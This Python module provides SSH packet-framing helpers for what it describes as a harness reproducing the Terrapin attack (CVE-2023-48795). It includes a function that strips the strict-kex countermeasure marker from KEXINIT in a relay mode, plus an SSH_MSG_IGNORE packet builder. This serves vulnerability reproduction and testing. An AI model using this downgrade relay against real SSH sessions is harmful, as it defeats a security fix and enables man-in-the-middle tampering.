"""
Frame layout (RFC 4253 ss 6):
    uint32    packet_length   (length of everything below, bytes)
    byte      padding_length
    byte[n1]  payload         (n1 = packet_length - padding_length - 1)
    byte[n2]  random padding  (n2 = padding_length)

During the unencrypted phase the "cipher block size" is treated as 8
bytes per spec, and padding_length must be >= 4.
"""

from __future__ import annotations

import secrets
import socket
import struct
from dataclasses import dataclass

BLOCK_SIZE = 8
MIN_PADDING = 4

# SSH message numbers we care about (RFC 4253 / RFC 4250).
SSH_MSG_IGNORE = 2
SSH_MSG_UNIMPLEMENTED = 3
SSH_MSG_KEXINIT = 20
SSH_MSG_NEWKEYS = 21

MSG_NAMES = {
    SSH_MSG_IGNORE: "SSH_MSG_IGNORE",
    SSH_MSG_UNIMPLEMENTED: "SSH_MSG_UNIMPLEMENTED",
    SSH_MSG_KEXINIT: "SSH_MSG_KEXINIT",
    SSH_MSG_NEWKEYS: "SSH_MSG_NEWKEYS",
}


def msg_name(msg_type: int) -> str:
    return MSG_NAMES.get(msg_type, f"UNKNOWN({msg_type})")


class ConnectionClosed(Exception):
    """Raised when a peer closes the TCP connection mid-read."""


def recv_exact(sock: socket.socket, n: int) -> bytes:
    """Read exactly n bytes or raise ConnectionClosed."""
    chunks = []
    remaining = n
    while remaining > 0:
        chunk = sock.recv(remaining)
        if not chunk:
            raise ConnectionClosed(f"peer closed while reading {n} bytes")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def recv_version_banner(sock: socket.socket) -> bytes:
    """Read the SSH identification string, terminated by CRLF (RFC 4253 s4.2)."""
    buf = bytearray()
    while not buf.endswith(b"\r\n"):
        byte = sock.recv(1)
        if not byte:
            raise ConnectionClosed("peer closed during version banner")
        buf += byte
        if len(buf) > 1024:
            raise ValueError("version banner exceeded 1024 bytes, aborting")
    return bytes(buf)


@dataclass
class PlainPacket:
    raw: bytes          # full frame, including the 4-byte length prefix
    msg_type: int
    payload: bytes       # payload INCLUDING the leading msg_type byte


def recv_plain_packet(sock: socket.socket) -> PlainPacket:
    """Read one unencrypted BPP frame from sock."""
    length_bytes = recv_exact(sock, 4)
    (packet_length,) = struct.unpack(">I", length_bytes)
    rest = recv_exact(sock, packet_length)
    padding_length = rest[0]
    payload = rest[1 : packet_length - padding_length]
    raw = length_bytes + rest
    msg_type = payload[0] if payload else -1
    return PlainPacket(raw=raw, msg_type=msg_type, payload=payload)


def build_plain_packet_from_payload(payload: bytes) -> bytes:
    """Frame an arbitrary payload (msg_type + body) as a plaintext BPP packet.

    RFC 4253 s6: the length of the concatenation of packet_length (4
    bytes), padding_length (1 byte), payload, and random padding MUST be
    a multiple of the cipher block size or 8, whichever is larger -- i.e.
    the 4-byte length field itself is included in the alignment
    requirement, not just the bytes after it.
    """
    LENGTH_FIELD_SIZE = 4
    for padding_length in range(MIN_PADDING, MIN_PADDING + BLOCK_SIZE):
        total = LENGTH_FIELD_SIZE + 1 + len(payload) + padding_length
        if total % BLOCK_SIZE == 0:
            break
    padding = secrets.token_bytes(padding_length)
    packet_length = 1 + len(payload) + padding_length
    return struct.pack(">I", packet_length) + bytes([padding_length]) + payload + padding


def build_plain_packet(msg_type: int, body: bytes = b"") -> bytes:
    return build_plain_packet_from_payload(bytes([msg_type]) + body)


def build_ignore_packet(data: bytes = b"") -> bytes:
    """SSH_MSG_IGNORE: byte type, uint32 length, byte[length] data (RFC 4253 s11.2)."""
    body = struct.pack(">I", len(data)) + data
    return build_plain_packet(SSH_MSG_IGNORE, body)


# ---------------------------------------------------------------------------
# KEXINIT strict-kex marker handling.
#
# OpenSSH's "strict kex" countermeasure (the fix for CVE-2023-48795) is
# signaled by appending a pseudo-algorithm name --
# "kex-strict-c-v00@openssh.com" (client) or "kex-strict-s-v00@openssh.com"
# (server) -- to the first name-list (kex_algorithms) of KEXINIT. If BOTH
# peers signal it, both sides reset sequence numbers at NEWKEYS and
# terminate the connection on any unexpected message during the initial
# exchange, which defeats the attack. Everything after that first
# name-list is left untouched and copied through byte-for-byte.
# ---------------------------------------------------------------------------

STRICT_KEX_PREFIX = "kex-strict-"


def strip_strict_kex_marker(payload: bytes) -> bytes:
    """Return a copy of a KEXINIT payload with any kex-strict-*  token removed.

    This lets the harness reproduce pre-patch (vulnerable) negotiation
    behavior even when testing against already-patched real binaries, by
    hiding each peer's strict-kex support from the other. Used for the
    STRIP_STRICT_KEX relay mode; see README.md.
    """
    assert payload[0] == SSH_MSG_KEXINIT, "not a KEXINIT payload"
    offset = 1 + 16  # msg_type + 16-byte cookie
    (list_len,) = struct.unpack_from(">I", payload, offset)
    list_start = offset + 4
    list_end = list_start + list_len
    name_list = payload[list_start:list_end].decode("ascii") if list_len else ""
    names = [n for n in name_list.split(",") if n]
    filtered = [n for n in names if not n.startswith(STRICT_KEX_PREFIX)]
    new_list = ",".join(filtered).encode("ascii")
    return (
        payload[:offset]
        + struct.pack(">I", len(new_list))
        + new_list
        + payload[list_end:]
    )


def has_strict_kex_marker(payload: bytes) -> bool:
    assert payload[0] == SSH_MSG_KEXINIT, "not a KEXINIT payload"
    offset = 1 + 16
    (list_len,) = struct.unpack_from(">I", payload, offset)
    list_start = offset + 4
    list_end = list_start + list_len
    name_list = payload[list_start:list_end].decode("ascii") if list_len else ""
    return any(n.startswith(STRICT_KEX_PREFIX) for n in name_list.split(","))
